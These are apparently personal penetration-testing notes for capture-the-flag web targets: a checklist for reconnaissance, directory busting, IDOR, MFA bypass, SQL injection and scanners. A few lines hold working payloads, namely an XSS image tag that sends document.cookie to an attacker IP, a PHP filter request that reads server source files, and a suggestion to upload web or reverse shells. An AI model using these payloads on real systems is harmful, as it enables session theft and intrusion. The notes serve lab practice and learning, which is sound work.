Quick check:
	is there a login?
		try admin, administrator..
		try sqli


What's running:
	check nmap
	look at web page
	view source code
	burp
		check X-Powered-By header

robots.txt

check source for
	links to "hidden" pages like admin-panels
	passwords
	hints
	mail addresses of users and admins/support/privileged users

go to the url for folders used on the site to check for file listings and other files
	especially if they are called files

list possible users and usernames
	validate?
		login form
		registation form

login
	second step of mfa can sometimes be bypassed by just going to a page requiring the access
	

check for IDOR
	numbers
	random ids
	...

Google
	"technology/framework" exploit
	poc
	cve

What's the file structure
	check common ones
		admin, 
	Directory busting
	[[InfoSec/Tools n Info/02 - Web Exploration/Fuzzing/gobuster|gobuster]]
	[[feroxbuster|feroxbuster]]

virtual hosts

checking for REST Endpoints or GET/POST parameters to exploit
	are there forms
	.ajax() call (if jQuery)
	.fetch 
	in browser
		forms: we find on the webpage - open the network tab in the dev tools of the browser - send off the form - see where the connection goes to in the network tab

Checking for REST Endpoints in the information we collected (source code or directory busting)

Parameters & Injections
	try changing id= 1 to 2 ... '
	"/item/13" <- change the 13 to 1 or 0
	html injections
		`<img src='http://10.10.14.156:8000/dog.jpg'>`
		`<img src='a' onerror='var i=new Image;i.src="http://10.10.14.156:8000/?"%2bdocument.cookie;'>`
	SQLi
	commands in the os's shell
	commands in programming language

Where ^
	forms
	parameters in url

PHP filter
	PHP://filter/convert.base64-encode/resource=
	example: `GET /test.php?view=PHP://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php HTTP/1.1`



webshell or revshell upload
	use what the system is built on; php, python django, vbscript node.js... perl might also work


Run scanners:
	`nikto -h http://whatever.thm`
	`whatweb -a 4 http://dailybugle.thm`
	``

https://owasp.org/www-project-web-security-testing-guide/latest/

